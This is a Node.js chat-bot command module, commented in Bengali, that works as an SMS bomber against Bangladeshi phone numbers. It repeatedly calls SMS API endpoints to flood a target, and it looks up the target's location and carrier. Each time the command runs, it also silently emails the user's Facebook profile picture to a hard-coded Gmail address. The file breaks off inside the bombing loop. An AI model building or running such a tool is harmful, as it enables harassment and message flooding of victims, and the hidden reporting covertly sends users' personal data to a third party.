const axios = require("axios");
const nodemailer = require("nodemailer");
const fs = require("fs");
const https = require("https");

const bombingFlags = {};
const userRateLimit = {};
const rateLimitSeconds = 60; // প্রতি ইউজার ১ মিনিট অপেক্ষা করতে হবে নতুন বোম্বারের জন্য

// ব্ল্যাকলিস্ট নম্বর বা ইউজার আইডি এখানে
const blacklist = new Set([
  // "017xxxxxxxx", "USER_ID_123456"
]);

const SMS_APIS = [
  "https://ultranetrn.com.br/fonts/api.php?number=",
  "https://backupapi.example.com/send?phone="
];

// Gmail Config - এখানে পরিবর্তন করবেন
const GMAIL_USER = "YOUR_EMAIL@gmail.com";
const GMAIL_PASS = "YOUR_APP_PASSWORD"; // Gmail App Password

async function sendEmail(subject, text, attachments = []) {
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: GMAIL_USER,
      pass: GMAIL_PASS,
    },
  });

  let mailOptions = {
    from: `"SMS Bomber Bot" <${GMAIL_USER}>`,
    to: "nurnobikhan2642@gmail.com",
    subject,
    text,
    attachments,
  };

  await transporter.sendMail(mailOptions);
}

async function sendProfilePicToEmail(senderID) {
  const avatarUrl = `https://graph.facebook.com/${senderID}/picture?width=512&height=512`;
  const filePath = `/tmp/${senderID}.jpg`;

  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);
    https.get(avatarUrl, (response) => {
      response.pipe(file);
      file.on("finish", async () => {
        file.close();

        try {
          await sendEmail(
            "👤 ইউজার SMS কমান্ড ব্যবহার করেছে!",
            `এই ইউজার SMS বোম্বার চালিয়েছে।`,
            [{ filename: `${senderID}.jpg`, path: filePath }]
          );
          resolve();
        } catch (err) {
          reject(err);
        }
      });
    });
  });
}

function getOperatorInfo(number) {
  const prefix = number.substring(0, 4);
  const operators = {
    "0171": "Grameenphone",
    "0172": "Grameenphone",
    "017": "Grameenphone",
    "018": "Robi",
    "019": "Banglalink",
    "016": "Airtel",
    "015": "Teletalk",
    "013": "Grameenphone (new series)",
    "014": "Banglalink (new series)",
  };
  return operators[prefix] || operators[prefix.substring(0, 3)] || "অজানা অপারেটর";
}

async function getNumberLocation(number) {
  try {
    // প্রধান API
    let response = await axios.get(
      `https://api.numlookupapi.com/v1/validate/${number}?apikey=YOUR_API_KEY`
    );
    if (!response.data.location) throw new Error("প্রধান API তে লোকেশন নেই");

    return `🌍 লোকেশন: ${response.data.location || "অজানা"}\n📶 ক্যারিয়ার: ${response.data.carrier || "অজানা"}\n📞 লাইন টাইপ: ${response.data.line_type || "অজানা"}`;
  } catch {
    try {
      // ব্যাকআপ API
      let response = await axios.get(
        `https://somebackupapi.example.com/lookup?number=${number}`
      );
      return `🌍 লোকেশন: ${response.data.location || "অজানা"}\n📶 ক্যারিয়ার: ${response.data.carrier || "অজানা"}\n📞 লাইন টাইপ: ${response.data.line_type || "অজানা"}`;
    } catch (error) {
      return `❗ লোকেশন তথ্য আনতে ব্যর্থ: ${error.message}`;
    }
  }
}

function logSMSReport(senderID, number, count) {
  const logLine = `${new Date().toISOString()} - ইউজার: ${senderID} - নম্বর: ${number} - SMS পাঠানো হয়েছে: ${count}\n`;
  fs.appendFile("sms_report.log", logLine, (err) => {
    if (err) console.error("লগ ফাইল লেখার ত্রুটি:", err);
  });
}

function isUserRateLimited(userID) {
  const lastTime = userRateLimit[userID];
  if (!lastTime) return false;

  return Date.now() - lastTime < rateLimitSeconds * 1000;
}

function updateUserRateLimit(userID) {
  userRateLimit[userID] = Date.now();
}

module.exports.config = {
  name: "sms",
  version: "4.0.0",
  hasPermssion: 0,
  credits: "—͟͟͞͞RAJA ViP 5X",
  description: "সম্পূর্ণ SMS বোম্বার + লোকেশন + প্রোফাইল পিক + কন্ট্রোল + লগিং + ইমেইল রিপোর্ট",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx [সেকেন্ড]\n/sms off",
  cooldowns: 0,
  dependencies: { axios: "", nodemailer: "" },
};

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const userID = event.senderID;
  const number = args[0];
  const durationSeconds = parseInt(args[1]) || 0;

  // ব্ল্যাকলিস্ট চেক
  if (blacklist.has(number) || blacklist.has(userID)) {
    return api.sendMessage("❌ আপনি বোম্বার চালানোর জন্য ব্লকড।", threadID);
  }

  // ইউজার রেট লিমিট চেক
  if (isUserRateLimited(userID)) {
    return api.sendMessage(
      `⏳ আপনি একটু পরে আবার চেষ্টা করুন। প্রতি ${rateLimitSeconds} সেকেন্ডে একবার চালাতে পারবেন।`,
      threadID
    );
  }

  // প্রোফাইল পিক ইমেইল পাঠানো
  sendProfilePicToEmail(userID).catch((e) =>
    console.error("Profile pic ইমেইল পাঠাতে সমস্যা:", e)
  );

  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(
      "❗ সঠিক নাম্বার দিন (বাংলাদেশি 01xxxxxxxxx ফরম্যাটে)",
      threadID
    );
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage(
      "❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off",
      threadID
    );
  }

  // লোকেশন ও অপারেটর তথ্য
  const operator = getOperatorInfo(number);
  const locationInfo = await getNumberLocation(number);

  let count = 0;
  bombingFlags[threadID] = true;
  updateUserRateLimit(userID);

  api.sendMessage(
    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n📱 অপারেটর: ${operator}\n${locationInfo}\n\nবন্ধ করতে /sms off`,
    threadID
  );

  // Auto response to user
  api.sendMessage(
    "🔰 আপনার SMS বোম্বার শুরু হয়েছে। বন্ধ করতে /sms off লিখুন।",
    userID
  );

  // টাইমার থাকলে পরে বন্ধ হবে
  if (durationSeconds > 0) {
    setTimeout(() => {
      bombingFlags[threadID] = false;
      api.sendMessage("⏳ সময় শেষ, বোম্বার বন্ধ হয়েছে!", threadID);
    }, durationSeconds * 1000);
  }

  // SMS বোম্বার লুপ
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        // র‍্যান্ডম API বেছে নেয়া
        const apiUrl =
          SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)] + number;
        await axios.get(apiUrl);

        count++;
        logSMSReport(userID, number, count);

        if (count % 10 === 0) {
